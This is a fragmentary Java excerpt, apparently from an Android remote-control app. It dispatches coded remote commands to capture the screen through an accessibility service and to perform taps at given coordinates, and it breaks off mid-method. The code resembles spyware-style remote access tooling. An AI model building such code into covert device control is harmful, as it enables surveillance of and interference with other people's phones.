            ...
            try {
                ...
                switch (order){
                    ...
                    case "x0000lm":
                        x0000lm();
                        break;
                    case "x0000sc": // New: Screen Capture
                        x0000sc();
                        break;
                    case "x0000pe": // Remote Click
                        x0000pe(data.getInt("x"), data.getInt("y"));
                        break;
   ...
   Log.e("error" , ex.getMessage());
    ...
    public static void x0000sc() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            ...
            if (service != null) {
                service.takeScreenCapture();
            } else {
                Log.e("ScreenManager", "Accessibility service not running!");
            }
        } else {
            // Older versions could take simple view screenshots or use MediaProjection
            Log.e("ScreenManager", "Screenshot only supported on Android 11+ via Accessibility.");
        }
    }

    public static void x0000pe(int x, int y) {
        RemoteControlService service = RemoteControlService.getInstance();
        if (service != null) {
